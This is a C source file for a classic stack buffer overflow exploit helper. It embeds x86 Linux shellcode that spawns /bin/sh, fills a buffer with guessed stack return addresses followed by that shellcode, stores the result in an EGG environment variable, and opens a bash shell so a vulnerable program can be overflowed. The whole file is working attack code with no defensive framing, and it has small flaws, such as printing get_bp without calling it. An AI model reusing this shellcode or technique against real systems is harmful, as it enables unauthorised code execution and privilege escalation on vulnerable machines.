#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512

char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
		__asm__("movl %esp,%eax");
}
unsigned long get_bp(void) {
		__asm__("movl %ebp,%eax");
}

void main(int argc, char *argv[]) {
		char *buff, *ptr;
		long *addr_ptr, addr;
		int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
		int i;

		if (argc > 1) bsize  = atoi(argv[1]);
		if (argc > 2) offset = atoi(argv[2]);

		if (!(buff = malloc(bsize))) {
				printf("Can't allocate memory.\n");
				exit(0);
		}
		addr = get_sp() - offset;
		printf("sp:   address: 0x%ld\n", addr);
		printf("bp:   address: 0x%ld\n", get_bp);
		printf("frame address: %p\n",__builtin_frame_address(0));
		printf("retur address: %p\n",__builtin_return_address(0));
		printf("retur address: %p\n",__builtin_return_address(1));

		ptr = buff;
		addr_ptr = (long *) ptr;
		for (i = 0; i < bsize; i+=4)
				*(addr_ptr++) = addr;

		ptr += 4;
		for (i = 0; i < strlen(shellcode); i++)
				*(ptr++) = shellcode[i];

		buff[bsize - 1] = '\0';

		memcpy(buff,"EGG=",4);
		putenv(buff);
		system("/bin/bash");
}
